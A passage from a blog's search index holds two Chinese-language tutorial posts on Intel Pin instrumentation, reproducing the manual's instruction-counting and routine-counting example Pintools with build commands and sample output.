<span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"><span class=\"comment\">/* Main                                                                  */</span></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span> * argv[])</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"comment\">// Initialize pin</span></div><div class=\"line\">    <span class=\"keyword\">if</span> (PIN_Init(argc, argv)) <span class=\"keyword\">return</span> Usage();</div><div class=\"line\"></div><div class=\"line\">    OutFile.open(KnobOutputFile.Value().c_str());</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// Register Instruction to be called to instrument instructions</span></div><div class=\"line\">    TRACE_AddInstrumentFunction(Trace, <span class=\"number\">0</span>);</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// Register Fini to be called when the application exits</span></div><div class=\"line\">    PIN_AddFiniFunction(Fini, <span class=\"number\">0</span>);</div><div class=\"line\">    </div><div class=\"line\">    <span class=\"comment\">// Start the program, never returns</span></div><div class=\"line\">    PIN_StartProgram();</div><div class=\"line\">    </div><div class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<h1 id=\"Procedure-Instruction-Count-Routine-Instrumentation\"><a href=\"#Procedure-Instruction-Count-Routine-Instrumentation\" class=\"headerlink\" title=\"Procedure Instruction Count (Routine Instrumentation)\"></a>Procedure Instruction Count (Routine Instrumentation)</h1><p>下例将介绍，计算程序中调用procedure数、每个procedure中执行过的指令数。结果默认保存在proccount.out中。</p>\n<p>命令和结果：<br><figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ ../../../pin -t obj-ia32/proccount.so -- /bin/grep proccount.cpp Makefile</div><div class=\"line\">proccount_SOURCES = proccount.cpp</div><div class=\"line\">$ head proccount.out</div><div class=\"line\">              Procedure           Image            Address        Calls Instructions</div><div class=\"line\">                  _fini       libc.so<span class=\"number\">.6</span>         <span class=\"number\">0x40144d00</span>            <span class=\"number\">1</span>           <span class=\"number\">21</span></div><div class=\"line\">__deregister_frame_info       libc.so<span class=\"number\">.6</span>         <span class=\"number\">0x40143f60</span>            <span class=\"number\">2</span>           <span class=\"number\">70</span></div><div class=\"line\">  __register_frame_info       libc.so<span class=\"number\">.6</span>         <span class=\"number\">0x40143df0</span>            <span class=\"number\">2</span>           <span class=\"number\">62</span></div><div class=\"line\">              fde_merge       libc.so<span class=\"number\">.6</span>         <span class=\"number\">0x40143870</span>            <span class=\"number\">0</span>            <span class=\"number\">8</span></div><div class=\"line\">            __init_misc       libc.so<span class=\"number\">.6</span>         <span class=\"number\">0x40115824</span>            <span class=\"number\">1</span>           <span class=\"number\">85</span></div><div class=\"line\">            __getclktck       libc.so<span class=\"number\">.6</span>         <span class=\"number\">0x401157f4</span>            <span class=\"number\">0</span>            <span class=\"number\">2</span></div><div class=\"line\">                 munmap       libc.so<span class=\"number\">.6</span>         <span class=\"number\">0x40112ca0</span>            <span class=\"number\">1</span>            <span class=\"number\">9</span></div><div class=\"line\">                   mmap       libc.so<span class=\"number\">.6</span>         <span class=\"number\">0x40112bb0</span>            <span class=\"number\">1</span>           <span class=\"number\">23</span></div><div class=\"line\">            getpagesize       libc.so<span class=\"number\">.6</span>         <span class=\"number\">0x4010f934</span>            <span class=\"number\">2</span>           <span class=\"number\">26</span></div><div class=\"line\">$</div></pre></td></tr></table></figure></p>\n<p>源码在 source/tools/ManualExamples/proccount.cpp<br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div><div class=\"line\">91</div><div class=\"line\">92</div><div class=\"line\">93</div><div class=\"line\">94</div><div class=\"line\">95</div><div class=\"line\">96</div><div class=\"line\">97</div><div class=\"line\">98</div><div class=\"line\">99</div><div class=\"line\">100</div><div class=\"line\">101</div><div class=\"line\">102</div><div class=\"line\">103</div><div class=\"line\">104</div><div class=\"line\">105</div><div class=\"line\">106</div><div class=\"line\">107</div><div class=\"line\">108</div><div class=\"line\">109</div><div class=\"line\">110</div><div class=\"line\">111</div><div class=\"line\">112</div><div class=\"line\">113</div><div class=\"line\">114</div><div class=\"line\">115</div><div class=\"line\">116</div><div class=\"line\">117</div><div class=\"line\">118</div><div class=\"line\">119</div><div class=\"line\">120</div><div class=\"line\">121</div><div class=\"line\">122</div><div class=\"line\">123</div><div class=\"line\">124</div><div class=\"line\">125</div><div class=\"line\">126</div><div class=\"line\">127</div><div class=\"line\">128</div><div class=\"line\">129</div><div class=\"line\">130</div><div class=\"line\">131</div><div class=\"line\">132</div><div class=\"line\">133</div><div class=\"line\">134</div><div class=\"line\">135</div><div class=\"line\">136</div><div class=\"line\">137</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">//</span></div><div class=\"line\"><span class=\"comment\">// This tool counts the number of times a routine is executed and </span></div><div class=\"line\"><span class=\"comment\">// the number of instructions executed in a routine</span></div><div class=\"line\"><span class=\"comment\">//</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;fstream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iomanip&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">\"pin.H\"</span></span></div><div class=\"line\"></div><div class=\"line\">ofstream outFile;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// Holds instruction count for a single procedure</span></div><div class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">struct</span> RtnCount</div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"built_in\">string</span> <span class=\"number\">_</span>name;</div><div class=\"line\">    <span class=\"built_in\">string</span> <span class=\"number\">_</span>image;</div><div class=\"line\">    ADDRINT <span class=\"number\">_</span>address;</div><div class=\"line\">    RTN <span class=\"number\">_</span>rtn;</div><div class=\"line\">    UINT64 <span class=\"number\">_</span>rtnCount;</div><div class=\"line\">    UINT64 <span class=\"number\">_</span>icount;</div><div class=\"line\">    <span class=\"keyword\">struct</span> RtnCount * <span class=\"number\">_</span>next;</div><div class=\"line\">&#125; RTN_COUNT;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// Linked list of instruction counts for each routine</span></div><div class=\"line\">RTN_COUNT * RtnList = <span class=\"number\">0</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// This function is called before every instruction is executed</span></div><div class=\"line\"><span class=\"function\">VOID <span class=\"title\">docount</span><span class=\"params\">(UINT64 * counter)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    (*counter)++;</div><div class=\"line\">&#125;</div><div class=\"line\">    </div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">const</span> <span class=\"keyword\">char</span> * <span class=\"title\">StripPath</span><span class=\"params\">(<span class=\"keyword\">const</span> <span class=\"keyword\">char</span> * path)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> * file = <span class=\"built_in\">strrchr</span>(path,<span class=\"string\">'/'</span>);</div><div class=\"line\">    <span class=\"keyword\">if</span> (file)</div><div class=\"line\">        <span class=\"keyword\">return</span> file+<span class=\"number\">1</span>;</div><div class=\"line\">    <span class=\"keyword\">else</span></div><div class=\"line\">        <span class=\"keyword\">return</span> path;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// Pin calls this function every time a new rtn is executed</span></div><div class=\"line\"><span class=\"function\">VOID <span class=\"title\">Routine</span><span class=\"params\">(RTN rtn, VOID *v)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    </div><div class=\"line\">    <span class=\"comment\">// Allocate a counter for this routine</span></div><div class=\"line\">    RTN_COUNT * rc = <span class=\"keyword\">new</span> RTN_COUNT;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// The RTN goes away when the image is unloaded, so save it now</span></div><div class=\"line\">    <span class=\"comment\">// because we need it in the fini</span></div><div class=\"line\">    rc-&gt;<span class=\"number\">_</span>name = RTN_Name(rtn);</div><div class=\"line\">    rc-&gt;<span class=\"number\">_</span>image = StripPath(IMG_Name(SEC_Img(RTN_Sec(rtn))).c_str());</div><div class=\"line\">    rc-&gt;<span class=\"number\">_</span>address = RTN_Address(rtn);</div><div class=\"line\">    rc-&gt;<span class=\"number\">_</span>icount = <span class=\"number\">0</span>;</div><div class=\"line\">    rc-&gt;<span class=\"number\">_</span>rtnCount = <span class=\"number\">0</span>;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// Add to list of routines</span></div><div class=\"line\">    rc-&gt;<span class=\"number\">_</span>next = RtnList;</div><div class=\"line\">    RtnList = rc;</div><div class=\"line\">            </div><div class=\"line\">    RTN_Open(rtn);</div><div class=\"line\">            </div><div class=\"line\">    <span class=\"comment\">// Insert a call at the entry point of a routine to increment the call count</span></div><div class=\"line\">    RTN_InsertCall(rtn, IPOINT_BEFORE, (AFUNPTR)docount, IARG_PTR, &amp;(rc-&gt;<span class=\"number\">_</span>rtnCount), IARG_END);</div><div class=\"line\">    </div><div class=\"line\">    <span class=\"comment\">// For each instruction of the routine</span></div><div class=\"line\">    <span class=\"keyword\">for</span> (INS ins = RTN_InsHead(rtn); INS_Valid(ins); ins = INS_Next(ins))</div><div class=\"line\">    &#123;</div><div class=\"line\">        <span class=\"comment\">// Insert a call to docount to increment the instruction counter for this rtn</span></div><div class=\"line\">        INS_InsertCall(ins, IPOINT_BEFORE, (AFUNPTR)docount, IARG_PTR, &amp;(rc-&gt;<span class=\"number\">_</span>icount), IARG_END);</div><div class=\"line\">    &#125;</div><div class=\"line\"></div><div class=\"line\">    </div><div class=\"line\">    RTN_Close(rtn);</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// This function is called when the application exits</span></div><div class=\"line\"><span class=\"comment\">// It prints the name and count for each procedure</span></div><div class=\"line\"><span class=\"function\">VOID <span class=\"title\">Fini</span><span class=\"params\">(INT32 code, VOID *v)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    outFile &lt;&lt; setw(<span class=\"number\">23</span>) &lt;&lt; <span class=\"string\">\"Procedure\"</span> &lt;&lt; <span class=\"string\">\" \"</span></div><div class=\"line\">          &lt;&lt; setw(<span class=\"number\">15</span>) &lt;&lt; <span class=\"string\">\"Image\"</span> &lt;&lt; <span class=\"string\">\" \"</span></div><div class=\"line\">          &lt;&lt; setw(<span class=\"number\">18</span>) &lt;&lt; <span class=\"string\">\"Address\"</span> &lt;&lt; <span class=\"string\">\" \"</span></div><div class=\"line\">          &lt;&lt; setw(<span class=\"number\">12</span>) &lt;&lt; <span class=\"string\">\"Calls\"</span> &lt;&lt; <span class=\"string\">\" \"</span></div><div class=\"line\">          &lt;&lt; setw(<span class=\"number\">12</span>) &lt;&lt; <span class=\"string\">\"Instructions\"</span> &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"keyword\">for</span> (RTN_COUNT * rc = RtnList; rc; rc = rc-&gt;<span class=\"number\">_</span>next)</div><div class=\"line\">    &#123;</div><div class=\"line\">        <span class=\"keyword\">if</span> (rc-&gt;<span class=\"number\">_</span>icount &gt; <span class=\"number\">0</span>)</div><div class=\"line\">            outFile &lt;&lt; setw(<span class=\"number\">23</span>) &lt;&lt; rc-&gt;<span class=\"number\">_</span>name &lt;&lt; <span class=\"string\">\" \"</span></div><div class=\"line\">                  &lt;&lt; setw(<span class=\"number\">15</span>) &lt;&lt; rc-&gt;<span class=\"number\">_</span>image &lt;&lt; <span class=\"string\">\" \"</span></div><div class=\"line\">                  &lt;&lt; setw(<span class=\"number\">18</span>) &lt;&lt; hex &lt;&lt; rc-&gt;<span class=\"number\">_</span>address &lt;&lt; dec &lt;&lt;<span class=\"string\">\" \"</span></div><div class=\"line\">                  &lt;&lt; setw(<span class=\"number\">12</span>) &lt;&lt; rc-&gt;<span class=\"number\">_</span>rtnCount &lt;&lt; <span class=\"string\">\" \"</span></div><div class=\"line\">                  &lt;&lt; setw(<span class=\"number\">12</span>) &lt;&lt; rc-&gt;<span class=\"number\">_</span>icount &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">    &#125;</div><div class=\"line\"></div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"><span class=\"comment\">/* Print Help Message                                                    */</span></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\">INT32 <span class=\"title\">Usage</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"built_in\">cerr</span> &lt;&lt; <span class=\"string\">\"This Pintool counts the number of times a routine is executed\"</span> &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">    <span class=\"built_in\">cerr</span> &lt;&lt; <span class=\"string\">\"and the number of instructions executed in a routine\"</span> &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">    <span class=\"built_in\">cerr</span> &lt;&lt; <span class=\"built_in\">endl</span> &lt;&lt; KNOB_BASE::StringKnobSummary() &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"><span class=\"comment\">/* Main                                                                  */</span></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span> * argv[])</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"comment\">// Initialize symbol table code, needed for rtn instrumentation</span></div><div class=\"line\">    PIN_InitSymbols();</div><div class=\"line\"></div><div class=\"line\">    outFile.open(<span class=\"string\">\"proccount.out\"</span>);</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// Initialize pin</span></div><div class=\"line\">    <span class=\"keyword\">if</span> (PIN_Init(argc, argv)) <span class=\"keyword\">return</span> Usage();</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// Register Routine to be called to instrument rtn</span></div><div class=\"line\">    RTN_AddInstrumentFunction(Routine, <span class=\"number\">0</span>);</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// Register Fini to be called when the application exits</span></div><div class=\"line\">    PIN_AddFiniFunction(Fini, <span class=\"number\">0</span>);</div><div class=\"line\">    </div><div class=\"line\">    <span class=\"comment\">// Start the program, never returns</span></div><div class=\"line\">    PIN_StartProgram();</div><div class=\"line\">    </div><div class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<h1 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h1><p><a href=\"https://software.intel.com/sites/landingpage/pintool/docs/67254/Pin/html/\" target=\"_blank\" rel=\"external\">Pin 用户手册</a></p>\n"},{"title":"Intel Pin 2 ：示例","url":"http://huirong.github.io/2015/12/30/Intel-Pin-example/","content":"<p><strong> analysis（分析） </strong> 和 <strong> instrumentation（桩） </strong> 函数定义参见 <a href=\"http://huirong.github.io/2015/12/30/Intel-Pin-introduction/\">Intel Pin 1 ：如何使用Pin进行插桩</a><br>为了说明如何编写 Pintools，这里介绍几个简单的例子。<br>对应的源码都在 source/tools/ManualExamples 目录中。<br><a id=\"more\"></a></p>\n<h1 id=\"Building-the-Example-Tools\"><a href=\"#Building-the-Example-Tools\" class=\"headerlink\" title=\"Building the Example Tools\"></a>Building the Example Tools</h1><p>首先进入 source/tools/ManualExamples 目录<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">cd</span> <span class=\"built_in\">source</span>/tools/ManualExamples</div></pre></td></tr></table></figure></p>\n<ul>\n<li><p>build 此目录中的所有examples：</p>\n <figure class=\"highlight vim\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">make</span> <span class=\"keyword\">all</span></div></pre></td></tr></table></figure>\n</li>\n<li><p>build 并 run 单个example（如，inscount0）</p>\n  <figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"selector-tag\">make</span> <span class=\"selector-tag\">inscount0</span><span class=\"selector-class\">.test</span></div></pre></td></tr></table></figure>\n</li>\n<li><p>build 单个example但不run（如，inscount0）</p>\n  <figure class=\"highlight gcode\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">make obj-i<span class=\"symbol\">ntel32</span>/i<span class=\"symbol\">nscount0</span>.so</div></pre></td></tr></table></figure>\n<p>  上述适用于 Intel32架构，对于 IA-32 ，使用 “obj-intel64” 替换 “obj-intel32”</p>\n <figure class=\"highlight gcode\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">make obj-i<span class=\"symbol\">ntel64</span>/i<span class=\"symbol\">nscount0</span>.so</div></pre></td></tr></table></figure>\n</li>\n</ul>\n<p><strong> <font color=\"red\">build Windows tools注意事项</font> </strong><br>由于使用 make build tools，首先需要安装 cygwin make</p>\n<h1 id=\"Simple-Instruction-Count-Instruction-Instrumentation\"><a href=\"#Simple-Instruction-Count-Instruction-Instrumentation\" class=\"headerlink\" title=\"Simple Instruction Count (Instruction Instrumentation)\"></a>Simple Instruction Count (Instruction Instrumentation)</h1><p>下面的例子是统计程序中所有执行过的指令数。在每个指令前，Pin插入 docount 函数，当程序退出时，结果默认保存在 inscount.out文件中。</p>\n<p>运行指令和结果如下：<br><figure class=\"highlight stata\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">../../../pin -t obj-ia32/inscount0.<span class=\"keyword\">so</span> -- /bin/<span class=\"keyword\">ls</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">cat</span> inscount.<span class=\"keyword\">out</span></div></pre></td></tr></table></figure></p>\n<p><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCgw1ezqzh1lcl2j30nk0al0uu.jpg\" alt=\"\"></p>\n<p>下例中的 KNOB 用于重定向输出，命令行选项 “-o <file_name>“ ，添加在 tool 名称和”–”之间，如下所示：<br><figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">../../../pin -t obj-ia32/inscount0<span class=\"selector-class\">.so</span> -o inscount0<span class=\"selector-class\">.log</span> -- /bin/ls</div></pre></td></tr></table></figure></file_name></p>\n<p>源程序详见 source/tools/ManualExamples/inscount0.cpp<br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;fstream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">\"pin.H\"</span></span></div><div class=\"line\"></div><div class=\"line\">ofstream OutFile;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// The running count of instructions is kept here</span></div><div class=\"line\"><span class=\"comment\">// make it static to help the compiler optimize docount</span></div><div class=\"line\"><span class=\"keyword\">static</span> UINT64 icount = <span class=\"number\">0</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// This function is called before every instruction is executed</span></div><div class=\"line\"><span class=\"function\">VOID <span class=\"title\">docount</span><span class=\"params\">()</span> </span>&#123; icount++; &#125;</div><div class=\"line\">    </div><div class=\"line\"><span class=\"comment\">// Pin calls this function every time a new instruction is encountered</span></div><div class=\"line\"><span class=\"function\">VOID <span class=\"title\">Instruction</span><span class=\"params\">(INS ins, VOID *v)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"comment\">// Insert a call to docount before every instruction, no arguments are passed</span></div><div class=\"line\">    INS_InsertCall(ins, IPOINT_BEFORE, (AFUNPTR)docount, IARG_END);</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\">KNOB&lt;<span class=\"built_in\">string</span>&gt; KnobOutputFile(KNOB_MODE_WRITEONCE, <span class=\"string\">\"pintool\"</span>,</div><div class=\"line\">    <span class=\"string\">\"o\"</span>, <span class=\"string\">\"inscount.out\"</span>, <span class=\"string\">\"specify output file name\"</span>);</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// This function is called when the application exits</span></div><div class=\"line\"><span class=\"function\">VOID <span class=\"title\">Fini</span><span class=\"params\">(INT32 code, VOID *v)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"comment\">// Write to a file since cout and cerr maybe closed by the application</span></div><div class=\"line\">    OutFile.setf(ios::showbase);</div><div class=\"line\">    OutFile &lt;&lt; <span class=\"string\">\"Count \"</span> &lt;&lt; icount &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">    OutFile.close();</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"><span class=\"comment\">/* Print Help Message                                                    */</span></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\">INT32 <span class=\"title\">Usage</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"built_in\">cerr</span> &lt;&lt; <span class=\"string\">\"This tool counts the number of dynamic instructions executed\"</span> &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">    <span class=\"built_in\">cerr</span> &lt;&lt; <span class=\"built_in\">endl</span> &lt;&lt; KNOB_BASE::StringKnobSummary() &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"><span class=\"comment\">/* Main                                                                  */</span></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"><span class=\"comment\">/*   argc, argv are the entire command line: pin -t &lt;toolname&gt; -- ...    */</span></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span> * argv[])</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"comment\">// Initialize pin</span></div><div class=\"line\">    <span class=\"keyword\">if</span> (PIN_Init(argc, argv)) <span class=\"keyword\">return</span> Usage();</div><div class=\"line\"></div><div class=\"line\">    OutFile.open(KnobOutputFile.Value().c_str());</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// Register Instruction to be called to instrument instructions</span></div><div class=\"line\">    INS_AddInstrumentFunction(Instruction, <span class=\"number\">0</span>);</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// Register Fini to be called when the application exits</span></div><div class=\"line\">    PIN_AddFiniFunction(Fini, <span class=\"number\">0</span>);</div><div class=\"line\">    </div><div class=\"line\">    <span class=\"comment\">// Start the program, never returns</span></div><div class=\"line\">    PIN_StartProgram();</div><div class=\"line\">    </div><div class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<h1 id=\"Instruction-Address-Trace-Instruction-Instrumentation\"><a href=\"#Instruction-Address-Trace-Instruction-Instrumentation\" class=\"headerlink\" title=\"Instruction Address Trace (Instruction Instrumentation)\"></a>Instruction Address Trace (Instruction Instrumentation)</h1><p>上例并没有传参给 analysis 函数 docount ，本节将介绍如何传递参数，参数可以是指令指针、当前寄存器的值、有效内存地址、常数等常见类型。查看完整参数类型列表，请参见<a href=\"https://software.intel.com/sites/landingpage/pintool/docs/67254/Pin/html/group__INST__ARGS.html#g7e2c955c99fa84246bb2bce1525b5681\" target=\"_blank\" rel=\"external\">IARG_TYPE.</a></p>\n<p>本示例用于打印执行过的指令的地址。程序编码上，和上例相比，做了微小改动，使用INS_InsertCall 函数传递即将执行的指令地址，并使用printip 替换 docount ，打印指令地址。结果保存在默认输出文件 itrace.out 